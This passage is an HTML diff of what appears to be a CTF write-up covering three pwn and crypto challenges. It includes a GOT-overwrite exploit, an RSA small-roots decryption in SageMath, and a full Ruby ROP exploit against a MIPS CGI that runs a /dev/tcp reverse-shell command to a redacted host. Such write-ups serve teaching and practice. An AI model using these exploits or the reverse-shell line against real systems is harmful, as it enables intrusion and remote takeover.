+  <span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">[</span><span class="n">got</span><span class="o">[</span><span class="s2">&quot;free&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">7</span><span class="o">]</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] overwrite got (free -&gt; system)&quot;</span>
+  <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">[</span><span class="n">offset</span><span class="o">[</span><span class="s2">&quot;system&quot;</span><span class="o">]].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;Q&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">...</span><span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>
+
+  <span class="nb">puts</span> <span class="s2">&quot;[*] launch shell&quot;</span>
+  <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="p">)</span>
+  <span class="n">release</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{the_returning_champion_mutepig}</code></p>
+<h2>gheart (Pwn 952pts)</h2>
+<p>The binary has 5 menus:</p>
+<ol>
+<li>sign in<ul>
+<li>To signin, we are required to solve an easy Proof of Work</li>
+</ul>
+</li>
+<li>show my heart<ul>
+<li>This feature shows us 3 types of hex numbers<ul>
+<li>my encrypted secret: encrypted flag</li>
+<li>my heart: RSA public key (n, e)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>show your heart<ul>
+<li>This feature leaks the higher bits of RSA private key (p) when we choose a large number as "size or your heart"</li>
+</ul>
+</li>
+<li>sign out</li>
+<li>exit</li>
+</ol>
+<p>These are the parameters I've collected from the remote server:</p>
+<div class="codehilite"><pre>higher bits of p: c68de09c8550f90cad2dcd7697d514286203e93baf328717ba208a3fc5db476379e7b75e43c117b417b9c140e3da4bc3c4005934456c813198f352cec6fb1b27fa0a081b990ab9bb
+e: 3
+n: 877149E3A16B31DA99D86792698F6348381FA2E1D16BAFD48E5CA5F46892AA26A64877813D00F2F847B18758E3EE384D95DD8B1FF01715A203ACB72965AB7946012D91B8AC24569E9B38360B84169C26F6B0554FB1A512662A8F3EF644C1708DCE169AF1CFE2A629A9FF6E7CD1E9FDDD15911A9AB813148680333133735E02647E9CEB41230246413FE23DAE65240775EE0BE827E61FD1DACC17717D5EDB3F79A49E63758DE86EC6AACA2CBA9DB66089AB1229D1AC45525C7A05BB6C94B203A80678EBA4955BF427593823BEA99BDE35DDA5010A4AF67524E8D2DC9B41A894EC8934701798E67E6871A9559C1D91C7C89A8BDB328D059C274DF6F6EDE860771D
+cipher text: 1EA7EEBA41287381903F9BE4A74BBCCE612657AF4C45A8ABFDDC89B16ED25247FB7F78EA6DDDA0EBAA42ADB8574A1DD70B7FE5C2A291C619257AD8B985A334E85166DCC5490C33A4491F55E7CA4395D7A02E33D64E15D57F2ED1E50C1DCDE7A9ED89A6D128F83CEC5259E19E91FD8137AF1530B5C560BB6313D4BDD6CF8BFDA7455C8DE33350B818F4FAFD568BBA96F77210441541FCFF1DC58ED8365AA07F2823D6F0FF1500048931594B849EBFF9219D5B17F202FE4166E6F0D2D589057635904235932479B6CAE498ECEE4DB3E5F0E85E0B5D93EBF162014614DFBDA61111E94D54738C7EE913F416B1704093C61AADF31D1D37A70A86C9608CB47ADCCBE2
+</pre></div>
+
+
+<p>... and the flag gets padded like this before encrypting:</p>
+<div class="codehilite"><pre><span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span> <span class="o">==</span> <span class="mi">46</span><span class="p">)</span>
+<span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;0&quot;</span> <span class="o">+</span> <span class="n">secret</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;6&quot;</span> <span class="o">*</span> <span class="mi">163</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>I passed all informations I've got to my team's crypto guy. (Because I'm not good at crypto :P)<br>
+He used SageMath to decrypt the flag.</p>
+<div class="codehilite"><pre><span class="n">n</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;877149E3A16B31DA99D86792698F6348381FA2E1D16BAFD48E5CA5F46892AA26A64877813D00F2F847B18758E3EE384D95DD8B1FF01715A203ACB72965AB7946012D91B8AC24569E9B38360B84169C26F6B0554FB1A512662A8F3EF644C1708DCE169AF1CFE2A629A9FF6E7CD1E9FDDD15911A9AB813148680333133735E02647E9CEB41230246413FE23DAE65240775EE0BE827E61FD1DACC17717D5EDB3F79A49E63758DE86EC6AACA2CBA9DB66089AB1229D1AC45525C7A05BB6C94B203A80678EBA4955BF427593823BEA99BDE35DDA5010A4AF67524E8D2DC9B41A894EC8934701798E67E6871A9559C1D91C7C89A8BDB328D059C274DF6F6EDE860771D&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;1EA7EEBA41287381903F9BE4A74BBCCE612657AF4C45A8ABFDDC89B16ED25247FB7F78EA6DDDA0EBAA42ADB8574A1DD70B7FE5C2A291C619257AD8B985A334E85166DCC5490C33A4491F55E7CA4395D7A02E33D64E15D57F2ED1E50C1DCDE7A9ED89A6D128F83CEC5259E19E91FD8137AF1530B5C560BB6313D4BDD6CF8BFDA7455C8DE33350B818F4FAFD568BBA96F77210441541FCFF1DC58ED8365AA07F2823D6F0FF1500048931594B849EBFF9219D5B17F202FE4166E6F0D2D589057635904235932479B6CAE498ECEE4DB3E5F0E85E0B5D93EBF162014614DFBDA61111E94D54738C7EE913F416B1704093C61AADF31D1D37A70A86C9608CB47ADCCBE2&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">F</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+<span class="n">PR</span><span class="o">.&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+<span class="n">x0</span> <span class="o">=</span> <span class="p">(((</span><span class="mi">2</span><span class="o">^</span><span class="mi">4</span><span class="p">)</span><span class="o">^</span><span class="mi">163</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="s">&#39;6&#39;</span> <span class="o">*</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span><span class="o">^</span><span class="mi">3</span> <span class="o">-</span> <span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span><span class="o">.</span><span class="n">small_roots</span><span class="p">(</span><span class="n">X</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">46</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+<span class="nb">hex</span><span class="p">(</span><span class="n">ZZ</span><span class="p">(</span><span class="n">x0</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
+<span class="c"># =&gt; &#39;flag{flappypig_c00l_and_wec0me_your_coming_1!}&#39;</span>
+</pre></div>
+
+
+<p>flag: <code>flag{flappypig_c00l_and_wec0me_your_coming_1!}</code></p>
+<h2>H-Link (Pwn 952pts)</h2>
+<p>This CGI has 2 features, SysInfo and Echo.</p>
+<p>SysInfo simply executes <code>pmap ${self_pid}</code>.<br>
+By calling SysInfo several times, I realized that the remote server has no ASLR.</p>
+<div class="codehilite"><pre>$ curl -v &#39;http://47.75.186.245:9999/cgi-bin/soap.cgi?local=1&#39; -H &#39;SoapAction: #SysInfo&#39;
+*   Trying 47.75.186.245...
+* Connected to 47.75.186.245 (47.75.186.245) port 9999 (#0)
+&gt; GET /cgi-bin/soap.cgi?local=1 HTTP/1.1
+&gt; Host: 47.75.186.245:9999
+&gt; User-Agent: curl/7.47.0
+&gt; Accept: */*
+&gt; SoapAction: #SysInfo
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri Apr 13 05:19:02 2018
+&lt; Content-Length: 829
+&lt; Connection: keep-alive
+&lt; X-Frame-Options: SAMEORIGIN
+&lt; Pragma: no-cache
+&lt; Cache-Control: no-cache
+&lt; Content-Type:  text/plain
+&lt;
+2381:   /ctf/goahead_home/www/cgi-bin/soap.cgi
+00400000      8K r-x--  /ctf/goahead_home/www/cgi-bin/soap.cgi
+00411000      4K rw---  /ctf/goahead_home/www/cgi-bin/soap.cgi
+00412000    132K rwx--    [ anon ]
+77e28000     64K rw---    [ anon ]
+77e38000   1464K r-x--  /lib/mips-linux-gnu/libc-2.13.so
+77fa6000     64K -----  /lib/mips-linux-gnu/libc-2.13.so
+77fb6000     36K r----  /lib/mips-linux-gnu/libc-2.13.so
+77fbf000      8K rw---  /lib/mips-linux-gnu/libc-2.13.so
+77fc1000     12K rw---    [ anon ]
+77fc4000    140K r-x--  /lib/mips-linux-gnu/ld-2.13.so
+77fef000      8K rw---    [ anon ]
+77ff5000      4K rw---    [ anon ]
+77ff6000      4K r----  /lib/mips-linux-gnu/ld-2.13.so
+77ff7000      4K rw---  /lib/mips-linux-gnu/ld-2.13.so
+7ffd6000    132K rwx--    [ stack ]
+7fff7000      4K r-x--    [ anon ]
+ total     2088K
+</pre></div>
+
+
+<p>Echo feature echoes the string given via "message" parameter.</p>
+<div class="codehilite"><pre>$ curl -v &#39;http://47.75.186.245:9999/cgi-bin/soap.cgi?local=1&amp;message=114514&#39; -H &quot;SoapAction: #Echo&quot;
+*   Trying 47.75.186.245...
+* Connected to 47.75.186.245 (47.75.186.245) port 9999 (#0)
+&gt; GET /cgi-bin/soap.cgi?local=1&amp;message=114514 HTTP/1.1
+&gt; Host: 47.75.186.245:9999
+&gt; User-Agent: curl/7.47.0
+&gt; Accept: */*
+&gt; SoapAction: #Echo
+&gt;
+&lt; HTTP/1.1 200 OK
+&lt; Date: Fri Apr 13 05:24:33 2018
+&lt; Content-Length: 6
+&lt; Connection: keep-alive
+&lt; X-Frame-Options: SAMEORIGIN
+&lt; Pragma: no-cache
+&lt; Cache-Control: no-cache
+&lt; Content-Type:  text/plain
+&lt;
+* Connection #0 to host 47.75.186.245 left intact
+114514
+</pre></div>
+
+
+<p>The Echo feature calls <code>strcpy</code> without checking the length of "message" parameter.<br>
+This leads to stack buffer overflow.</p>
+<p>Since "message" parameter is given via query string, we have to build our payload without using null-bytes, whitespaces, and ampersands.<br>
+This is not a big problem because libc is given and ASLR is disabled on remote server.</p>
+<p>Exploit:</p>
+<div class="codehilite"><pre><span class="c1">#coding:ascii-8bit</span>
+<span class="nb">require</span> <span class="s2">&quot;pwnlib&quot;</span>
+
+<span class="n">remote</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s2">&quot;r&quot;</span>
+<span class="k">if</span> <span class="n">remote</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;47.75.186.245&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+<span class="k">else</span>
+  <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+  <span class="n">port</span> <span class="o">=</span> <span class="mi">54321</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">tube</span>
+  <span class="vi">@tube</span>
+<span class="k">end</span>
+
+<span class="n">reverse_shell_host</span> <span class="o">=</span> <span class="s2">&quot;REDACTED&quot;</span><span class="p">;</span>
+<span class="n">reverse_shell_port</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">;</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;bash${IFS}-c${IFS}&#39;bash&lt;/dev/tcp/</span><span class="si">#{</span><span class="n">reverse_shell_host</span><span class="si">}</span><span class="s2">/</span><span class="si">#{</span><span class="n">reverse_shell_port</span><span class="si">}</span><span class="s2">&#39;;&quot;</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x77e38000</span>
+<span class="n">fake_fp</span> <span class="o">=</span> <span class="mh">0x7fff6b48</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x84</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">fake_fp</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;&quot;</span><span class="p">)</span>  <span class="c1"># fp</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x11afa8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;&quot;</span><span class="p">)</span>  <span class="c1"># ra (set s1)</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">24</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># s0</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x41da0</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;&quot;</span><span class="p">)</span>  <span class="c1"># s1 = system</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">fake_fp</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;&quot;</span><span class="p">)</span>  <span class="c1"># fp</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xe5170</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;L&gt;&quot;</span><span class="p">)</span>  <span class="c1"># ra (call system)</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">64</span>
+<span class="k">if</span> <span class="n">cmd</span><span class="o">.</span><span class="n">length</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span>
+  <span class="n">cmd</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;_&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">cmd</span><span class="o">.</span><span class="n">length</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span>
+<span class="k">end</span>
+<span class="n">payload</span> <span class="o">&lt;&lt;</span> <span class="n">cmd</span>
+
+<span class="k">raise</span> <span class="k">if</span> <span class="n">payload</span> <span class="o">=~</span> <span class="sr">/[\0\s&amp;]/</span>
+
+<span class="no">PwnTube</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">){</span><span class="o">|</span><span class="n">t</span><span class="o">|</span>
+  <span class="vi">@tube</span> <span class="o">=</span> <span class="n">t</span>
+
+  <span class="n">a</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+  <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;GET /cgi-bin/soap.cgi?local=1&amp;message=</span><span class="si">#{</span><span class="n">payload</span><span class="si">}</span><span class="s2"> HTTP/1.1</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;Host: 47.75.186.245:9999</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+  <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="s2">&quot;SoapAction: #Echo</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
+  <span class="n">tube</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+  <span class="n">tube</span><span class="o">.</span><span class="n">interactive</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>flag: <code>HITB{fdfbf27aaf678a3785df6d343f3309e1}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
